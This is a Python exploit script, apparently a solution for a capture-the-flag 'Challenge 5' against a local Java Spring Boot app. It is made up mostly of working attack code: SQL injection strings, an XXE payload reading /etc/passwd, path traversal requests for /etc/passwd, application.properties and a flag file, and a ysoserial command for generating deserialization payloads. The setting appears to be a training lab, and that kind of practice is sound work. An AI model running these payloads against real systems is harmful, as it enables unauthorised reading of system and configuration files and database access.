#!/usr/bin/env python3
"""
Exploit script for Challenge 5: Java Spring Boot Enterprise App
Chains Deserialization + SQLi + XXE + Path Traversal
"""

import requests
import base64

BASE_URL = "http://localhost:8080"

def exploit_sqli():
    """Exploit SQL injection"""
    print("[*] Attempting SQL injection...")
    
    payloads = [
        "' OR '1'='1' --",
        "' UNION SELECT 1,2,3 --",
        "admin' --"
    ]
    
    for payload in payloads:
        print(f"[*] Trying payload: {payload}")
        try:
            response = requests.get(
                f"{BASE_URL}/api/employees",
                params={"search": payload},
                timeout=3
            )
            print(f"[+] Response: {response.text[:200]}")
        except Exception as e:
            print(f"[-] Error: {e}")

def exploit_xxe():
    """Exploit XXE"""
    print("[*] Attempting XXE...")
    
    xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>"""
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/reports",
            data=xxe_payload,
            headers={"Content-Type": "application/xml"},
            timeout=3
        )
        print(f"[+] Response: {response.text[:500]}")
    except Exception as e:
        print(f"[-] Error: {e}")

def exploit_path_traversal():
    """Exploit path traversal"""
    print("[*] Attempting path traversal...")
    
    paths = [
        "../../../../etc/passwd",
        "../../../../application.properties",
        "../../../../flag.txt"
    ]
    
    for path in paths:
        print(f"[*] Trying path: {path}")
        try:
            response = requests.get(
                f"{BASE_URL}/api/admin/config",
                params={"file": path},
                timeout=3
            )
            print(f"[+] Response: {response.text[:500]}")
        except Exception as e:
            print(f"[-] Error: {e}")

def get_flag():
    """Get flag from admin endpoint"""
    print("[*] Attempting to get flag...")
    
    try:
        response = requests.get(f"{BASE_URL}/api/admin/flag", timeout=3)
        if response.status_code == 200:
            flag = response.text
            print(f"[+] FLAG FOUND: {flag}")
            return flag
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return None

def main():
    print("=" * 60)
    print("Challenge 5: Java Spring Boot Enterprise App Exploit")
    print("=" * 60)
    
    exploit_sqli()
    exploit_xxe()
    exploit_path_traversal()
    get_flag()
    
    print("\n[!] Note: Java deserialization requires ysoserial tool")
    print("[!] Generate payload: java -jar ysoserial.jar CommonsCollections5 'command'")

if __name__ == "__main__":
    main()

